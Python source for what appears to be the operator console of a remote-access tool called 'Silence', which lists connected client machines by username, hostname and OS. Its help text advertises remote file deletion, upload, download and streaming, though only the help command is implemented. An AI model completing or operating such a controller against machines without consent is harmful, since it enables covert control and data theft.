import socketio
import time
import os
from rich.console import Console
from rich.table import Table

HELP = """Commands:
    shell [id] - Sets the current shell
    list [online] - Lists clients
    update - Updates the current shell
    clear - Clears the console
"""

SHELL_HELP = """Commands:
    mkdir [directory] - Creates a new directory
    listdir [path] - Lists a directory
    cwd - Returns the current working directory
    install_dir - Returns the install directory
    remove [any] - Removes a directory or file
    start_stream - Starts a stream
    kill_stream - Kills a stream
    upload [file] [dest] - Uploads a file from the local upload directory
    download [path] - Downloads a file from client to download directory
    clear - Clears the console
    exit - Kills current shell
"""


class AdminShell:
    def __init__(self, host):
        self.host = host
        self.sio_client = socketio.Client()
        self.condition_responded = False
        self.clients = None
        self.current_shell = None
        self.console = Console()

    def run(self):
        self.sio_client.connect(self.host)
        self.sio_client.emit("get_data", callback=self.on_data)
        self.sync_responded()
        self.command_loop()

    def command_loop(self):
        while True:
            if self.current_shell is None:
                command = self.get_input()
                self.process_command(command.strip())
            else:
                command = self.get_input(self.clients[self.current_shell]["hostname"] + " ")
                self.process_shell_command(command.strip())

            self.sync_responded()

    def process_command(self, cli):
        cli_spl = cli.split(" ")

        if cli_spl[0] == "help":
            self.console.print(HELP)
        elif cli_spl[0] == "list":
            self.print_shell_options()
        elif cli_spl[0] == "shell":
            self.set_current_shell(int(cli_spl[1]))
            self.console.clear()
        elif cli_spl[0] == "update":
            self.sio_client.emit("get_data", callback=self.on_data)
            self.sync_responded()
        elif cli_spl[0] == "clear":
            self.console.clear()
        else:
            self.print_error_msg("Invalid command")

    def process_shell_command(self, cli):
        cli_spl = cli.split(" ")

        if cli_spl[0] == "help":
            self.console.print(SHELL_HELP)
        else:
            self.print_error_msg("Invalid command")

    def set_current_shell(self, index):
        self.current_shell = index

        if self.current_shell >= len(self.clients) or self.current_shell < 0:
            self.current_shell = None
            self.print_error_msg("Invalid shell")

    def get_input(self, msg=""):
        self.console.print(f"[bold cyan]{msg}>>[/bold cyan] ", end="")
        return input("")

    def print_error_msg(self, msg):
        self.console.print(f"[bold red]{msg}[/bold red]")

    def print_shell_options(self):
        client_table = Table(title="Silence clients")

        client_table.add_column("ID", justify="right", style="cyan", no_wrap=True)
        client_table.add_column("Username", justify="right", style="cyan", no_wrap=True)
        client_table.add_column("Hostname", style="magenta")
        client_table.add_column("OS", justify="left", style="green")

        for index, client in enumerate(self.clients):
            client_table.add_row(str(index + 1), client["username"], client["hostname"], client["os"])

        self.console.print(client_table)

    def sync_responded(self):
        while not self.condition_responded:
            time.sleep(0.3)

    def on_data(self, data):
        self.clients = data
        self.condition_responded = True
